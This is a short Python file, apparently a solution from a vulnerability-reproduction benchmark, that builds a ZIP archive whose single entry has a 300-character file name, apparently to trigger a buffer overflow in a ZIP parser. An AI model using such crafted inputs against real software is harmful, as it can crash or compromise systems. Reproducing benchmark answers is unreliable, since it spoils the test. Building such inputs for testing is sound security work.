import io
import zipfile


class Solution:
    def solve(self, src_path: str) -> bytes:
        long_filename = "A" * 300 + ".txt"
        content = b"X"
        mem = io.BytesIO()
        with zipfile.ZipFile(mem, 'w', compression=zipfile.ZIP_STORED, allowZip64=False) as zf:
            zi = zipfile.ZipInfo(long_filename)
            zi.compress_type = zipfile.ZIP_STORED
            zi.date_time = (1980, 1, 1, 0, 0, 0)
            zi.create_system = 0
            zi.external_attr = 0
            zf.writestr(zi, content)
        return mem.getvalue()